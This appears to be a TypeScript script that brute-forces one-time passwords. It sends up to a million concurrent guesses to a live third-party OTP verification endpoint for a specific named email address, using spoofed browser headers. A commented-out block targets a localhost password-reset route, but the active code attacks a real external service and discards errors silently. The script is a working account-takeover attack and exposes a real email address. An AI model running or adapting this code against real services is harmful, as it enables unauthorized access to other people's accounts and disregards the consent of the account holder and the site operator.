import axios  from "axios";
import { json } from "express";


async function sendRequest(otp: string){

    let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=nkulhari96%40gmail.com&otp=${otp}&mydeviceid=&mydeviceid2=`,
    headers: { 
        'accept': '*/*', 
        'accept-language': 'en-US,en;q=0.9', 
        'auth-key': 'appxapi', 
        'client-service': 'Appx', 
        'device-type': '', 
        'origin': 'https://harkirat.classx.co.in', 
        'priority': 'u=1, i', 
        'referer': 'https://harkirat.classx.co.in/', 
        'sec-fetch-dest': 'empty', 
        'sec-fetch-mode': 'cors', 
        'sec-fetch-site': 'same-site', 
        'source': 'website', 
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'
    }
    };

    try {
        await axios.request(config)
    } catch (error) {
        
    }




    // let data = JSON.stringify({
    //     "email":"nkulhari96@gmail.com",
    //     "otp": otp,
    //     "newPassword": "Qwerty@1234"
    // });

    // let config = {
    //     method: 'post',
    //     maxBodyLength: Infinity,
    //     url: 'http://localhost:3000/reset-password',
    //     headers: { 
    //       'Content-Type': 'application/json'
    //     },
    //     data : data
    //   };

    // try {
    //     await axios.request(config);
    //     console.log("done for " + otp)
    // } catch (error) {
    //     //console.log(error)
    // }
}


async function main(){
    for (let i=0; i<1000000; i+=100){
        const promises = [];
        console.log(i)
        for(let j=0; j<100; j++){
            promises.push(sendRequest((i+j).toString()));
        }
        await Promise.all(promises);
    }
}

main() 